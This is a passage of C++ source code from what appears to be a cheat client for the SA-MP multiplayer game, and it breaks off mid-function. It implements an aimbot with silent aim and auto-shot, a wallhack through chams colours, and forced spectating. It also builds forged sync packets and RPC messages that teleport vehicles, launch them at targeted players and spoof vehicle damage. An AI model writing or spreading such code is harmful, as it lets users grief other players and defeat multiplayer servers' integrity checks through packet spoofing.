#include "main.h"


struct stEnemyStats EnemyStats[SAMP_MAX_PLAYERS];
struct stMenuSettings MenuSettings;


std::list<std::string> overlight_chat;


// damn this because i use malloc
void initialize_OL_Cheats()
{
	memset(&OLCheats[0], 0, sizeof(stOL_Cheats));

	OLCheats->bChangeGPCIa = true;
	OLCheats->Target_PlayerID = -1;
	OLCheats->iFPS = 200;
	OLCheats->fInaccurateAim = 0.20f;
	OLCheats->dwTimeFakeLagSync = 100;
	OLCheats->bSyncWhenAim = true;
	OLCheats->bRenderFinder = true;
	OLCheats->fMultiplierFakeSpeed = 2.5f;
	OLCheats->iLimitMessages = 500;
	OLCheats->bUseNearestTarget = true;
	OLCheats->bNoFall = true;
	OLCheats->SendRateCarCheatTick = 50;
	OLCheats->bAFKFilter = true;
	OLCheats->bAlive = true;
	OLCheats->bVisibleFilter = true;
	OLCheats->iStickID = -1;
	OLCheats->bAntiLoading = true;
	OLCheats->bUsersPrinted = true;
	OLCheats->bPrintFriends = true;
	OLCheats->bPrintClock = true;
	OLCheats->bTranspBackGroundChat = true;
	OLCheats->bSendServer = true;
	OLCheats->bSendNickname = true;

	OLCheats->fColorChamsBehindWall[0] = 0.0f;
	OLCheats->fColorChamsBehindWall[1] = 0.0f;
	OLCheats->fColorChamsBehindWall[2] = 255.0f;
	OLCheats->fColorChamsBehindWall[3] = 100.0f;

	OLCheats->fColorChamsInFrontWall[0] = 0.0f;
	OLCheats->fColorChamsInFrontWall[1] = 255.0f;
	OLCheats->fColorChamsInFrontWall[2] = 255.0f;
	OLCheats->fColorChamsInFrontWall[3] = 100.0f;

	OLCheats->ChamsTypeBehindWall = D3DFILL_WIREFRAME;
	OLCheats->ChamsTypeInFrontWall = D3DFILL_SOLID;

	OLCheats->fSlowValue = 350;
}

uint16_t GetAimingBot()
{

	static uint16_t NearestCenterPlayerID = -1;
	float NearestDistance = -1;
	float DistPlayerScreen[2];
	for (int i = 0; i < SAMP_MAX_PLAYERS; i++)
	{
		if (i == g_Players->sLocalPlayerID)
			continue;

		if (g_BotFuncs->uiIsBot[i][0] != 1)
			continue;

		actor_info *player = getGTAPedFromSAMPPlayerID(i);
		if (!player)
			continue;



		CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)player);
		if (!pPed)
			continue;

		//CVector pos = *pPed->GetPosition();
		CVector pSpinePos;
		D3DXVECTOR3 player_pos, player_pos_on_screen;
		pPed->GetBonePosition(BONE_SPINE1, &pSpinePos);

		player_pos.x = CVecToD3DXVEC(pSpinePos).x;
		player_pos.y = CVecToD3DXVEC(pSpinePos).y;
		player_pos.z = CVecToD3DXVEC(pSpinePos).z;
		CalcScreenCoors(&player_pos, &player_pos_on_screen);

		if (player_pos_on_screen.z < 1.f)
			continue;


		DistPlayerScreen[0] = abs((g_NewModSa->fViewFinderPosition[0]) - (player_pos_on_screen.x));
		DistPlayerScreen[1] = abs((g_NewModSa->fViewFinderPosition[1]) - (player_pos_on_screen.y));

		float CurrentDistance = sqrtf((DistPlayerScreen[0] * DistPlayerScreen[0]) + (DistPlayerScreen[1] * DistPlayerScreen[1]));

		if (NearestDistance == -1)
		{
			NearestDistance = CurrentDistance;
		}


		bool IsPlayerAfk = g_Players->pRemotePlayer[i]->pPlayerData->iAFKState == 2;

		if (CurrentDistance <= NearestDistance)
		{
			NearestDistance = CurrentDistance;
			NearestCenterPlayerID = i;
		}
	}
	return g_BotFuncs->uiIsBot[NearestCenterPlayerID][1];

}


void OL_Spectate()
{
	if (!g_Players)
		return;

	if (OLCheats->bSpectate)
	{
		g_Players->pLocalPlayer->iIsSpectating = 1;
		g_Players->pLocalPlayer->iSpectateID = OLCheats->iSpectateID;
		g_Players->pLocalPlayer->iInitiatedSpectating = 1;
	}
}


// SWG4 with Zip War Airgon
int GetAimingPlayer(bool bFromWhenPress)
{
	static int NearestCenterPlayerID = -1;
	float fNearestDistanceScreen = -1;
	float DistPlayerScreen[2];
	static bool bPickedEnemy = false;


	if ((!g_Players->pLocalPlayer->onFootData.stSampKeys.keys_aim && bFromWhenPress)
		|| cheat_state->state != CHEAT_STATE_ACTOR
		|| g_NewModSa->iAimPlayerID == -1)
	{
		bPickedEnemy = false;
		for (int i = 0; i < SAMP_MAX_PLAYERS; i++)
		{
			if (i == g_Players->sLocalPlayerID)
				continue;

			if (g_BotFuncs->uiIsBot[i][0] == 1)
				continue;

			actor_info *player = getGTAPedFromSAMPPlayerID(i);
			if (!player)
				continue;

			CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)player);
			if (!pPed)
				continue;

			//CVector pos = *pPed->GetPosition();
			CVector pSpinePos;
			D3DXVECTOR3 player_pos, player_pos_on_screen;
			pPed->GetBonePosition(BONE_SPINE1, &pSpinePos);

			player_pos.x = CVecToD3DXVEC(pSpinePos).x;
			player_pos.y = CVecToD3DXVEC(pSpinePos).y;
			player_pos.z = CVecToD3DXVEC(pSpinePos).z;
			CalcScreenCoors(&player_pos, &player_pos_on_screen);

			if (player_pos_on_screen.z < 1.f)
				continue;


			DistPlayerScreen[0] = abs((g_NewModSa->fViewFinderPosition[0]) - (player_pos_on_screen.x));
			DistPlayerScreen[1] = abs((g_NewModSa->fViewFinderPosition[1]) - (player_pos_on_screen.y));

			float fCurrentDistanceScreen = sqrtf((DistPlayerScreen[0] * DistPlayerScreen[0]) + (DistPlayerScreen[1] * DistPlayerScreen[1]));

			float fDistanceFromEnemy = vect3_dist(&g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12],
				&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12]);

			if (!OLCheats->bOutOfRange)
			{
				if (fDistanceFromEnemy > fWeaponRange[g_Players->pLocalPlayer->byteCurrentWeapon])
					continue;
			}

			if (fNearestDistanceScreen == -1)
			{
				fNearestDistanceScreen = fCurrentDistanceScreen;
			}


			bool IsPlayerAfk = g_Players->pRemotePlayer[i]->pPlayerData->iAFKState == 2;

			// get the camera
			CCamera *pCamera = pGame->GetCamera();

			// grab the active cam
			CCamSAInterface *pCam = (CCamSAInterface *)((CCamSA *)pCamera->GetCam(pCamera->GetActiveCam()))->GetInterface();
			CVector src = pCam->Source;


			bool IsPlayerVisible = pGame->GetWorld()->IsLineOfSightClear(&src, &pSpinePos, true, false, false, true, true, false, false);
			

			if (fCurrentDistanceScreen <= fNearestDistanceScreen)
			{
				fNearestDistanceScreen = fCurrentDistanceScreen;
				if (OLCheats->bSilentAim || OLCheats->bAutoShot)
				{
					if (!(g_NewModSa->bIsFriend[i] && OLCheats->bFriendFilter)
						&& !(OLCheats->bTeamFilter && (g_Players->pRemotePlayer[i]->pPlayerData->byteTeamID == g_Players->pLocalPlayer->byteTeamID))
						&& !(OLCheats->bColorFilter && (samp_color_get(i) == samp_color_get(g_Players->sLocalPlayerID)))
						&& !(OLCheats->bSkinFilter && (g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.model_alt_id == g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.model_alt_id))
						&& !((OLCheats->bVisibleFilter && !OLCheats->bShotWall) && !IsPlayerVisible)
						&& !(OLCheats->bAFKFilter && IsPlayerAfk)
						&& !(OLCheats->bAlive && g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->hitpoints == 0))
					{
						NearestCenterPlayerID = i;
						g_NewModSa->fPosAimPlayerID[0] = player_pos_on_screen.x;
						g_NewModSa->fPosAimPlayerID[1] = player_pos_on_screen.y;
					}
					else
					{
						continue;
					}
				}
				else
				{
					NearestCenterPlayerID = i;
					g_NewModSa->fPosAimPlayerID[0] = player_pos_on_screen.x;
					g_NewModSa->fPosAimPlayerID[1] = player_pos_on_screen.y;
				}
			}
			bPickedEnemy = true;
		}
	}
	else 
	{
		if (!bPickedEnemy)
			g_NewModSa->iAimPlayerID = -1;

		if (g_NewModSa->iAimPlayerID != -1)
		{

			if (IsPlayerStreamed(g_NewModSa->iAimPlayerID))
			{

				actor_info *player = getGTAPedFromSAMPPlayerID(g_NewModSa->iAimPlayerID);
				if (!player)
					return -1;

				CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)player);
				if (!pPed)
					return -1;

				//CVector pos = *pPed->GetPosition();
				CVector pSpinePos;
				D3DXVECTOR3 player_pos, player_pos_on_screen;
				pPed->GetBonePosition(BONE_SPINE1, &pSpinePos);

				player_pos.x = CVecToD3DXVEC(pSpinePos).x;
				player_pos.y = CVecToD3DXVEC(pSpinePos).y;
				player_pos.z = CVecToD3DXVEC(pSpinePos).z;
				CalcScreenCoors(&player_pos, &player_pos_on_screen);

				if (player_pos_on_screen.z < 1.f)
					return -1;
				float fDistanceFromEnemy = vect3_dist(&g_Players->pRemotePlayer[g_NewModSa->iAimPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12],
					&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12]);

				if (!OLCheats->bOutOfRange)
				{
					if (fDistanceFromEnemy > fWeaponRange[g_Players->pLocalPlayer->byteCurrentWeapon])
						return -1;
				}

				if (OLCheats->bVisibleFilter)
				{
					// get the camera
					CCamera *pCamera = pGame->GetCamera();

					// grab the active cam
					CCamSAInterface *pCam = (CCamSAInterface *)((CCamSA *)pCamera->GetCam(pCamera->GetActiveCam()))->GetInterface();
					CVector src = pCam->Source;


					bool IsPlayerVisible = pGame->GetWorld()->IsLineOfSightClear(&src, &pSpinePos, true, false, false, true, true, false, false);

					if (!IsPlayerVisible)
						return -1;
				}

				g_NewModSa->fPosAimPlayerID[0] = player_pos_on_screen.x;
				g_NewModSa->fPosAimPlayerID[1] = player_pos_on_screen.y;
			}
		}
	}
	if (OLCheats->bSilentAim)
	{
		if (g_NewModSa->iAimPlayerID != -1)
			if (IsPlayerStreamed(g_NewModSa->iAimPlayerID))
			{
				render->D3DLine(g_NewModSa->fViewFinderPosition[0],
					g_NewModSa->fViewFinderPosition[1],
					g_NewModSa->fPosAimPlayerID[0],
					g_NewModSa->fPosAimPlayerID[1],
					samp_color_get(g_NewModSa->iAimPlayerID));
			}
	}

	if (!bPickedEnemy)
		return -1;

	return NearestCenterPlayerID;
}

bool GetPlayerQuaternion(uint16_t playerID, float* fQuaternion)
{
	
	switch (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState)
	{
	case PLAYER_STATE_DRIVER:
		vect4_copy(g_Players->pRemotePlayer[playerID]->pPlayerData->inCarData.fQuaternion, fQuaternion);
		return true;
		break;
	default:
		vect4_copy(g_Players->pRemotePlayer[playerID]->pPlayerData->onFootData.fQuaternion, fQuaternion);
		return true;
		break;
	}
}

bool IsPlayerStreamed(uint16_t playerID)
{
	if (g_Players == NULL)
		return false;
	if (g_Players->iIsListed[playerID] != 1)
		return false;
	if (g_Players->pRemotePlayer[playerID] == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
		return false;
	return true;
}

bool IsVehicleStreamed(uint16_t vehicleID)
{
	//if (g_Players->pLocalPlayer->sCurrentVehicleID == OLCheats->iVehicleID) { continue; }
	if (g_Vehicles->iIsListed[vehicleID] != 1)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID] == NULL)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle == NULL)
		return false;
	return true;
}

int NearestPlayer()
{
	actor_info *self = actor_info_get(ACTOR_SELF, 0);

	float fNearestDistance = -1.0f;
	int iplayerID = -1;

	for (int playerID = 0; playerID < SAMP_MAX_PLAYERS; playerID++)
	{
		if (g_Players->iIsListed[playerID] != 1)
			continue;
		if (g_Players->pRemotePlayer[playerID] == NULL)
			continue;
		if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
			continue;
		if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
			continue;	// not streamed
		if (g_BotFuncs->uiIsBot[playerID][0] == 1)
			continue;
		if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
			continue;
		float fDistance = vect3_dist(&self->base.matrix[12], &g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12]);
		if (fNearestDistance == -1.0f || fDistance < fNearestDistance)
		{
			iplayerID = playerID;
			fNearestDistance = fDistance;
		}
	}

	return iplayerID;
}

int NearestPassenger()
{
	actor_info *self = actor_info_get(ACTOR_SELF, 0);

	float fNearestDistance = -1.0f;
	int iplayerID = -1;

	for (int playerID = 0; playerID < SAMP_MAX_PLAYERS; playerID++)
	{
		if (g_Players->iIsListed[playerID] != 1)
			continue;
		if (g_Players->pRemotePlayer[playerID] == NULL)
			continue;
		if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
			continue;
		if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
			continue;	// not streamed
		if (g_BotFuncs->uiIsBot[playerID][0] == 1)
			continue;
		if (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState != PLAYER_STATE_PASSENGER)
			continue;
		if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
			continue;
		float fDistance = vect3_dist(&self->base.matrix[12], &g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12]);
		if (fNearestDistance == -1.0f || fDistance < fNearestDistance)
		{
			iplayerID = playerID;
			fNearestDistance = fDistance;
		}
	}

	return iplayerID;
}


int NextPlayer(int iplayerID, int increase)
{
	if (increase == -1)
	{
		for (int playerID = iplayerID -1; playerID >= 0; playerID--)
		{
			if (g_Players->iIsListed[playerID] != 1)
				continue;
			if (g_Players->pRemotePlayer[playerID] == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
				continue;	// not streamed
			if (g_BotFuncs->uiIsBot[playerID][0] == 1)
				continue;
			if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
				continue;
			return playerID;
		}
	}
	else
	{
		for (int playerID = iplayerID + 1; playerID < SAMP_MAX_PLAYERS; playerID++)
		{
			if (g_Players->iIsListed[playerID] != 1)
				continue;
			if (g_Players->pRemotePlayer[playerID] == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
				continue;	// not streamed
			if (g_BotFuncs->uiIsBot[playerID][0] == 1)
				continue;
			if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
				continue;
			return playerID;
		}
	}

	return iplayerID;
}

int NextPlayerPassenger(int iplayerID, int increase)
{
	if (increase == -1)
	{
		for (int playerID = iplayerID - 1; playerID >= 0; playerID--)
		{
			if (g_Players->iIsListed[playerID] != 1)
				continue;
			if (g_Players->pRemotePlayer[playerID] == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
				continue;	// not streamed
			if (g_BotFuncs->uiIsBot[playerID][0] == 1)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState != PLAYER_STATE_PASSENGER)
				continue;
			if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
				continue;
			return playerID;
		}
	}
	else
	{
		for (int playerID = iplayerID + 1; playerID < SAMP_MAX_PLAYERS; playerID++)
		{
			if (g_Players->iIsListed[playerID] != 1)
				continue;
			if (g_Players->pRemotePlayer[playerID] == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
				continue;	// not streamed
			if (g_BotFuncs->uiIsBot[playerID][0] == 1)
				continue;
			if (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState != PLAYER_STATE_PASSENGER)
				continue;
			if (!OLCheats->bUseFriendTarget && g_NewModSa->bIsFriend[playerID])
				continue;
			return playerID;
		}
	}

	return iplayerID;
}

void VehicleLocalSync(float fPos[3], float fSpeed[3])
{
	vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(OLCheats->iVehicleID);
	cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
	vect3_copy(fSpeed, vinfo->speed);
}

void VehicleSync(float fPos[3], float fSpeed[3])
{
	BitStream bsData;
	BitStream bsData4RPC;
	stInCarData InCar;
	stUnoccupiedData UnoccupiedData;
	vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(OLCheats->iVehicleID);
	if (!g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle
		&& !OLCheats->bVehicleGrabberMap)
	{
		BitStream bsData4OnFoot;
		bsData4OnFoot.Write((BYTE)ID_PLAYER_SYNC);
		bsData4OnFoot.Write((PCHAR)&g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
		g_RakFuncs->Send(&bsData4OnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
	switch (OLCheats->iSyncType)
	{
	case VEHICLE_SYNC_IN_CAR:
		memset(&InCar, 0, sizeof(stInCarData));
		InCar.sVehicleID = OLCheats->iVehicleID;
		InCar.fVehicleHealth = vinfo->hitpoints;//1000.0f;
		InCar.bytePlayerHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
		InCar.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
		InCar.fQuaternion[3] = 1;
		vect3_copy(fPos, InCar.fPosition);
		vect3_copy(fSpeed, InCar.fMoveSpeed);
		bsData.Write((BYTE)ID_VEHICLE_SYNC);
		bsData.Write((PCHAR)&InCar, sizeof(stInCarData));
		g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		break;
	case VEHICLE_SYNC_UNOCCUPIED:
		memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
		UnoccupiedData.sVehicleID = OLCheats->iVehicleID;
		vect3_copy(fPos, UnoccupiedData.fPosition);
		vect3_copy(fSpeed, UnoccupiedData.fMoveSpeed);
		UnoccupiedData.byteSeatID = 1;
		UnoccupiedData.fDirection[1] = 1;
		UnoccupiedData.fRoll[0] = 1;
		UnoccupiedData.fHealth = vinfo->hitpoints;//1000.0f;
		bsData.Write((BYTE)ID_UNOCCUPIED_SYNC);
		bsData.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
		g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		break;
	case VEHICLE_SYNC_IN_CAR_RPC:
		bsData4RPC.Write(OLCheats->iVehicleID);
		bsData4RPC.Write(0);
		g_RakFuncs->RPC(RPC_EnterVehicle, &bsData4RPC);
		memset(&InCar, 0, sizeof(stInCarData));
		InCar.sVehicleID = OLCheats->iVehicleID;
		InCar.fVehicleHealth = vinfo->hitpoints;//1000.0f;
		InCar.bytePlayerHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
		InCar.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
		InCar.fQuaternion[3] = 1;
		vect3_copy(fPos, InCar.fPosition);
		vect3_copy(fSpeed, InCar.fMoveSpeed);
		bsData.Write((BYTE)ID_VEHICLE_SYNC);
		bsData.Write((PCHAR)&InCar, sizeof(stInCarData));
		g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		break;
	}
}

void GetStreamedVehicle()
{
	for (OLCheats->iVehicleID++; OLCheats->iVehicleID < SAMP_MAX_VEHICLES; OLCheats->iVehicleID++)
	{
		if (g_Players->pLocalPlayer->sCurrentVehicleID == OLCheats->iVehicleID) { continue; }
		if (g_Vehicles->iIsListed[OLCheats->iVehicleID] != 1) { continue; }
		if (g_Vehicles->pSAMP_Vehicle[OLCheats->iVehicleID] == NULL) { continue; }
		if (g_Vehicles->pSAMP_Vehicle[OLCheats->iVehicleID]->pGTA_Vehicle == NULL) { continue; }
		if ((OLCheats->bWithoutDriver || 
			OLCheats->iSyncType == VEHICLE_SYNC_UNOCCUPIED) 
			&& g_Vehicles->pSAMP_Vehicle[OLCheats->iVehicleID]->pGTA_Vehicle->passengers[0] != NULL)
			continue;
		break;
	}

}

void OL_DoorStorm()
{
	OLCheats->bIsVehCheatActive = true;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		stOnFootData OnFoot;
		memset(&OnFoot, 0, sizeof(stOnFootData));
		OnFoot.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
		OnFoot.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFoot.fPosition);
		OnFoot.sSurfingVehicleID = vehicleID;
		OnFoot.fSurfingOffsets[2] = -100.0f;
		BitStream bsOnFoot;
		bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
		bsOnFoot.Write((PCHAR)&OnFoot, sizeof(stOnFootData));
		g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		stUnoccupiedData Unoccupied;
		memset(&Unoccupied, 0, sizeof(stUnoccupiedData));
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], Unoccupied.fPosition);
		Unoccupied.fPosition[2] += 0.5f;
		Unoccupied.sVehicleID = vehicleID;
		Unoccupied.fHealth = 1000.0f;
		Unoccupied.fRoll[0] = 1.0f;
		Unoccupied.fDirection[1] = 1.0f;
		Unoccupied.fTurnSpeed[2] = 4.0f;
		Unoccupied.byteSeatID = 1;
		BitStream bsUnoccupied;
		bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
		bsUnoccupied.Write((PCHAR)&Unoccupied, sizeof(stUnoccupiedData));
		g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		static int iDoorDamage = 0, iBumperDamage = 0;
		if (iDoorDamage == 0)
		{
			iDoorDamage = encode_doors(4, 4, 4, 4);
			iBumperDamage = encode_panels(3, 3, 3, 3, 3, 3, 3);
		}
		else
		{
			iDoorDamage = 0;
			iBumperDamage = 0;
		}

		BitStream bsDamageVehicle;
		bsDamageVehicle.Write(vehicleID);
		bsDamageVehicle.Write(iBumperDamage);//(panel);
		bsDamageVehicle.Write(iDoorDamage);//(door);
		bsDamageVehicle.Write(0);//(lights);
		bsDamageVehicle.Write(0);//tires
		g_RakFuncs->RPC(RPC_DamageVehicle, &bsDamageVehicle);
	}
}


void OL_CarShooter()
{
	OLCheats->bIsVehCheatActive = true;
	if (KEY_DOWN(VK_LBUTTON))
	{
		GetStreamedVehicle();
		if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
		{
			OLCheats->iVehicleID = 0;
			return;
		}
		float fPos[3];
		float fRandomDistance = 6.5f + (rand() % 1000) / 100;
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
		fPos[0] += cam_matrix[4] * fRandomDistance;
		fPos[1] += cam_matrix[5] * fRandomDistance;
		fPos[2] += cam_matrix[6] * fRandomDistance;
		float fSpeed[3];
		fSpeed[0] = cam_matrix[4] * 7.5f;
		fSpeed[1] = cam_matrix[5] * 7.5f;
		fSpeed[2] = cam_matrix[6] * 7.5f;

		VehicleLocalSync(fPos, fSpeed);
		VehicleSync(fPos, fSpeed);
	}
}

void OL_CarShooter_Once()
{
	OLCheats->bIsVehCheatActive = true;
	static bool bPressed = false;
	if (KEY_DOWN(VK_LBUTTON))
	{
		if (!bPressed)
		{
			GetStreamedVehicle();
			if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
			{
				OLCheats->iVehicleID = 0;
				return;
			}
			float fPos[3];
			float fRandomDistance = 6.5f + (rand() % 1000) / 100;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
			fPos[0] += cam_matrix[4] * fRandomDistance;
			fPos[1] += cam_matrix[5] * fRandomDistance;
			fPos[2] += cam_matrix[6] * fRandomDistance;
			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			VehicleLocalSync(fPos, fSpeed);
			VehicleSync(fPos, fSpeed);
			bPressed = true;
		}
	}
	else 
	{
		bPressed = false;
	}
}

void OL_FusRoDah()
{
	OLCheats->bIsVehCheatActive = true;
	static bool bScream = false;
	static bool bScreamStarted = false;
	if (KEY_DOWN(VK_LBUTTON) || bScreamStarted)
	{
		bScreamStarted = true;
		if (!bScream)
		{
			GetStreamedVehicle();
			if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
			{
				OLCheats->iVehicleID = 0;
				bScream = true;
				bScreamStarted = false;
				return;
			}
			float fPos[3];
			float fRandomDistance = 6.5f + (rand() % 1000) / 100;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
			fPos[0] += cam_matrix[4] * fRandomDistance;
			fPos[1] += cam_matrix[5] * fRandomDistance;
			fPos[2] += cam_matrix[6] * fRandomDistance;
			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			VehicleLocalSync(fPos, fSpeed);
			VehicleSync(fPos, fSpeed);
		}
	}
	else
	{
		bScream = false;
	}
}

void OL_FantozziCloud()
{
	OLCheats->bIsVehCheatActive = true;
	GetStreamedVehicle();
	if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
	{
		OLCheats->iVehicleID = 0;
		return;
	}
	if (IsPlayerStreamed(OLCheats->Target_PlayerID))
	{
		float fPos[3];
		vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
		fPos[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->onFootData.fMoveSpeed[0]
			* 10.97f;
		fPos[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->onFootData.fMoveSpeed[1]
			* 10.97f;
		fPos[2] += 5.0f + (float)(rand() % 10);
		float fSpeed[3];
		vect3_copy(g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed, fSpeed);
		fSpeed[2] = -10.0f;
		VehicleLocalSync(fPos, fSpeed);
		VehicleSync(fPos, fSpeed);
	}

}


void OL_FakeShooter()
{
	OLCheats->bIsVehCheatActive = true;
	if (KEY_DOWN(VK_LBUTTON))
	{
		GetStreamedVehicle();
		if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
		{
			OLCheats->iVehicleID = 0;
			return;
		}
		if (IsPlayerStreamed(OLCheats->Target_PlayerID))
		{
			float fPos[3];
			vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
			float fRandomDistance = 6.5f + (rand() % 1000) / 100;
			fPos[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[4] * fRandomDistance;
			fPos[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[5] * fRandomDistance;
			fPos[2] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[6] * fRandomDistance;
			float fSpeed[3];
			memset(fSpeed, 0, sizeof(fSpeed));
			//vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], fSpeed);
			fSpeed[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[4] * 7.5f;
			fSpeed[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[5] * 7.5f;
			fSpeed[2] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->base.matrix[6] * 7.5f;
			VehicleLocalSync(fPos, fSpeed);
			VehicleSync(fPos, fSpeed);
		}
	}
}

void OL_InvisibleBike2()
{
	OLCheats->bIsVehCheatActive = true;
	static DWORD dwInvisibleTick = GetTickCount();
	static int times = 0;
	bool wrong_way = false;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		if (!vinfo)
			return;
		if (vinfo->vehicle_type == VEHICLE_TYPE_BIKE)
		{
			if (GetTickCount() - dwInvisibleTick >= 1000)
			{
				stOnFootData OnFootData;
				memset(&OnFootData, 0, sizeof(stOnFootData));
